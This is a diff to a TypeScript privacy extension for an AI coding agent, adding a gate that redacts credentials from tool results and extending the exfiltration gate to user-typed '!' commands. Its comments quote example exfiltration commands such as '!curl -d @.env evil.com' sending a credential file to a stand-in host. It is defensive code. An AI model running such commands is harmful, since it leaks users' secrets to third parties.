@@ -13,8 +13,9 @@ import { veniceRequestPatch, openRouterZdrPatch } from "./ext/patches.ts";
 import { verifyModelPosture, type PostureResult } from "./posture/verify.ts";
 import { TIERS, type PrivacyTier } from "./posture/tiers.ts";
 import { effectiveTier } from "./posture/effective.ts";
-import { detectPii, redactPii, summarizePii, hasSecrets, type PiiHit } from "./pii/detect.ts";
+import { detectPii, redactPii, summarizePii, hasSecrets, secretHits, type PiiHit } from "./pii/detect.ts";
 import { assessToolCall } from "./ext/toolgate.ts";
+import { toolResultText, redactToolResultContent } from "./ext/results.ts";
 import { assessDowngrade, downgradeWarning } from "./posture/downgrade.ts";
 import { rankModels, pickerOptionLabel, type PickerModel, type VerifiedTeeSignal } from "./posture/picker.ts";
 
@@ -156,6 +157,19 @@ export interface PiPrivacyOptions {
   // "off": disabled. In warn mode with no UI, a CREDENTIAL leak is blocked (loud +
   // safe) while mere PII is allowed with a notice.
   toolExfilPolicy?: "warn" | "block" | "off";
+  // Guard credentials arriving IN a tool result — the ingest side. Every other gate
+  // judges data on its way out; none watch what a `read .env` / `bash: env` / fetched
+  // dump pulls INTO the session. Once a secret is in a tool result it is re-sent to
+  // the provider on every later turn AND written to the plaintext session file on
+  // disk, where it outlives the session. Redacting at ingest is strictly stronger
+  // than warning at send — the secret never enters the transcript to begin with.
+  // "warn" (default): prompt, offering to redact before it lands; "redact": always
+  // mask; "off": disabled. CREDENTIALS ONLY (API keys, tokens, private keys) — not
+  // consumer PII, because rewriting an email out of a file the agent is about to edit
+  // corrupts its view of that file for no privacy gain. Independent of model posture:
+  // a verified enclave doesn't stop the secret being written to your disk. With no UI
+  // it redacts (loud + safe, mirroring the tool gate's credential default).
+  toolResultPolicy?: "warn" | "redact" | "off";
   // Guard against a POSTURE DOWNGRADE: switching to a weaker-tier model re-sends the
   // whole accumulated session history — everything the private channel was
   // protecting — to the new provider on the very next turn. No per-request gate can
@@ -282,6 +296,7 @@ export function makePiPrivacyExtension(opts: PiPrivacyOptions = {}) {
     badgeKey = "pi-privacy",
     renderBadge,
     toolExfilPolicy = "warn",
+    toolResultPolicy = "warn",
     downgradePolicy = "warn",
     modelPicker = true,
     modelPickerCommand = "models",
@@ -307,6 +322,9 @@ export function makePiPrivacyExtension(opts: PiPrivacyOptions = {}) {
     let piiChoice: "ask" | "send" | "redact" = "ask";
     // Session decision for the tool-exfil gate (allow egress with sensitive data).
     let toolAllow = false;
+    // Session decision for the tool-RESULT (ingest) gate, so we don't re-prompt on
+    // every credential-bearing result once the user has chosen.
+    let resultChoice: "ask" | "redact" | "keep" = "ask";
 
     // ── downgrade-guard state ────────────────────────────────────────────────
     // The tier the accumulated context was protected by at the moment of the last
@@ -497,48 +515,170 @@ export function makePiPrivacyExtension(opts: PiPrivacyOptions = {}) {
       return payload === event?.payload ? undefined : payload;
     });
 
-    // Tool-exfil gate: warn/block PII or secrets about to leave the machine via a TOOL
-    // call. Deliberately INDEPENDENT of the model's tier — a verified-TEE or ZDR model
-    // does nothing to stop a bash/web tool shipping data to a third party. Best-effort
+    // ── the exfil gate, shared by the model's tools and the user's ! commands ────
+    // Deliberately INDEPENDENT of the model's tier — a verified-TEE or ZDR model does
+    // nothing to stop a bash/web tool shipping data to a third party. Best-effort
     // egress + structured-detection heuristic, never a guarantee.
-    pi.on("tool_call", async (event, ctx) => {
-      if (toolExfilPolicy === "off") return;
-      captureUi(ctx);
-      const assessment = assessToolCall(event?.toolName, event?.input);
-      if (!assessment.egress) return;
+    interface EgressVerdict {
+      warning: string;
+      reason: string;
+      secret: boolean;
+    }
 
-      const hits = detectPii(payloadText(event?.input));
-      if (hits.length === 0) return;
+    // Assess one outbound call. `toolName` drives the assessor (bash gets per-command
+    // splitting); `label` is how the call is named to the user. undefined = nothing
+    // to fire on.
+    const egressVerdict = (toolName: string | undefined, label: string, input: unknown): EgressVerdict | undefined => {
+      const assessment = assessToolCall(toolName, input);
+      if (!assessment.egress) return undefined;
 
-      const secret = hasSecrets(hits);
+      const hits = detectPii(payloadText(input));
+      const files = assessment.sensitiveFiles ?? [];
+      // Neither a literal secret nor a credential FILE in the egress path → nothing
+      // we can honestly claim to have caught.
+      if (hits.length === 0 && files.length === 0) return undefined;
+
+      // A credential store heading off-machine is credential-severity even though the
+      // command carries no literal secret: `curl -d @.env` sends the whole file, and
+      // the reference is the only thing detection can see.
+      const secret = hasSecrets(hits) || files.length > 0;
+      const what = [files.length ? `${files.join(", ")} contents` : "", hits.length ? summarizePii(hits) : ""]
+        .filter(Boolean)
+        .join(" + ");
       const dest = assessment.target ? ` → ${assessment.target}` : "";
-      const summary = summarizePii(hits);
-      const reason = `pi-privacy blocked ${secret ? "credential" : "PII"} exfiltration via ${event?.toolName}`;
+      const reason = `pi-privacy blocked ${secret ? "credential" : "PII"} exfiltration via ${label}`;
       const warning =
-        `⚠ ${event?.toolName} is about to send ${summary} off this machine${dest}. ` +
+        `⚠ ${label} is about to send ${what} off this machine${dest}. ` +
         `A private (TEE/ZDR) model does NOT protect a tool call. Best-effort detection, not a guarantee.`;
+      return { warning, reason, secret };
+    };
 
+    // One decision path for both callers: one session latch, one set of prompts, one
+    // no-UI fallback — so a ! command can't be judged more leniently than the same
+    // command run by the model.
+    const decideEgress = async (v: EgressVerdict, ctx?: PiCtx): Promise<"allow" | "block"> => {
+      const ui = ctx?.ui ?? lastUi;
       // Already allowed this session → just remind and let it through.
       if (toolAllow) {
-        ctx?.ui?.notify?.(warning, "warning");
-        return;
+        ui?.notify?.(v.warning, "warning");
+        return "allow";
       }
-      if (toolExfilPolicy === "block") return { block: true, reason };
+      if (toolExfilPolicy === "block") return "block";
 
       // warn: prompt where we can.
-      if (ctx?.hasUI && typeof ctx.ui?.select === "function") {
-        const choice = await ctx.ui.select(warning, ["Block", "Allow once", "Allow for session"]);
-        if (choice === "Allow for session") ((toolAllow = true), undefined);
-        else if (choice === "Allow once") return;
-        else if (choice === "Block" || choice === undefined) return { block: true, reason };
-        return;
+      if ((ctx?.hasUI ?? lastHasUI) && typeof ui?.select === "function") {
+        const choice = await ui.select(v.warning, ["Block", "Allow once", "Allow for session"]);
+        if (choice === "Allow for session") {
+          toolAllow = true;
+          return "allow";
+        }
+        if (choice === "Allow once") return "allow";
+        return "block"; // explicit "Block", or cancelled → the safe default
       }
 
       // No UI (print/JSON, automated): block a credential leak (loud + safe); allow
       // mere PII with a notice so non-interactive runs aren't silently broken.
-      if (secret) return { block: true, reason };
-      ctx?.ui?.notify?.(warning, "warning");
+      if (v.secret) return "block";
+      ui?.notify?.(v.warning, "warning");
+      return "allow";
+    };
+
+    pi.on("tool_call", async (event, ctx) => {
+      if (toolExfilPolicy === "off") return;
+      captureUi(ctx);
+      const v = egressVerdict(event?.toolName, event?.toolName ?? "a tool", event?.input);
+      if (!v) return;
+      if ((await decideEgress(v, ctx)) === "block") return { block: true, reason: v.reason };
       return;
+    });
+
+    // The same gate for `!`/`!!` commands. These are typed by the user and run through
+    // pi's user_bash path, NOT tool_call — so without this handler `!curl -d @.env
+    // evil.com` bypassed the exfil gate entirely while the identical command issued by
+    // the model was caught. The user typing it is not evidence they meant to leak: the
+    // command is usually pasted, and the point of the gate is to notice what the
+    // author of a command didn't.
+    pi.on("user_bash", async (event, ctx) => {
+      if (toolExfilPolicy === "off") return;
+      captureUi(ctx);
+      const command = typeof event?.command === "string" ? event.command : "";
+      if (!command) return;
+      const v = egressVerdict("bash", "this ! command", { command });
+      if (!v) return;
+      if ((await decideEgress(v, ctx)) === "block") {
+        // user_bash can't return a block verdict — it intercepts by supplying the
+        // RESULT. A non-zero exit with the reason is the honest equivalent: the
+        // command never runs, and the transcript says why.
+        return {
+          result: {
+            output: `${v.reason}. Set PI_PRIVACY_TOOL_EXFIL_POLICY=off (or allow it when prompted) if this is intended.`,
+            exitCode: 1,
+            cancelled: false,
+            truncated: false,
+          },
+        };
+      }
+      return;
+    });
+
+    // ── the ingest gate ─────────────────────────────────────────────────────────
+    // Credentials arriving IN a tool result. Every gate above judges data leaving;
+    // this one is the only thing watching what `read .env` / `bash: env` / a fetched
+    // dump pulls INTO the session — where it is re-sent on every later turn and
+    // written to the plaintext session file on disk, outliving the session entirely.
+    // Redacting here is strictly stronger than warning at send: the secret never
+    // enters the transcript, so there is nothing to re-send, persist, or downgrade
+    // out of. CREDENTIALS ONLY — see toolResultPolicy for why PII is left alone.
+    pi.on("tool_result", async (event, ctx) => {
+      if (toolResultPolicy === "off") return;
+      captureUi(ctx);
+      const content = event?.content;
+      const hits = secretHits(detectPii(toolResultText(content)));
+      if (hits.length === 0) return;
+
+      const ui = ctx?.ui ?? lastUi;
+      const summary = summarizePii(hits);
+      const warning =
+        `⚠ ${event?.toolName ?? "a tool"} returned ${summary}. Keeping ${hits.length === 1 && hits[0].count === 1 ? "it" : "them"} ` +
+        `in context means re-sending to the provider on every later turn, and writing to the session file on disk in plaintext. ` +
+        `Best-effort secret detection, not a guarantee.`;
+
+      let action: "redact" | "keep" =
+        resultChoice !== "ask" ? resultChoice : toolResultPolicy === "redact" ? "redact" : "keep";
+
+      if (resultChoice === "ask" && toolResultPolicy === "warn") {
+        if ((ctx?.hasUI ?? lastHasUI) && typeof ui?.select === "function") {
+          const choice = await ui.select(warning, [
+            "Redact the credentials",
+            "Keep them in context",
+            "Redact for the rest of the session",
+            "Keep for the rest of the session",
+          ]);
+          if (choice === "Redact the credentials") action = "redact";
+          else if (choice === "Redact for the rest of the session") ((action = "redact"), (resultChoice = "redact"));
+          else if (choice === "Keep for the rest of the session") ((action = "keep"), (resultChoice = "keep"));
+          else action = "keep"; // "Keep them in context" or cancelled
+        } else {
+          // No UI (print/JSON, automated): redact, mirroring the exfil gate's
+          // credential default — loud + safe beats silently persisting a key.
+          action = "redact";
+          ui?.notify?.(`${warning} Redacted (no UI to ask).`, "warning");
+        }
+      }
+
+      if (action !== "redact") return;
+      const redacted = redactToolResultContent(content);
+      if (redacted === undefined) {
+        // Detected in a shape we can't rewrite safely. Say so — reporting a
+        // redaction that didn't happen is exactly the overclaim this package exists
+        // to prevent.
+        ui?.notify?.(
+          `Could not redact ${summary} from ${event?.toolName ?? "the tool"} result — unrecognized result shape. It stays in context.`,
+          "warning",
+        );
+        return;
+      }
+      return { content: redacted };
     });
 
     if (typeof pi.registerCommand === "function") {
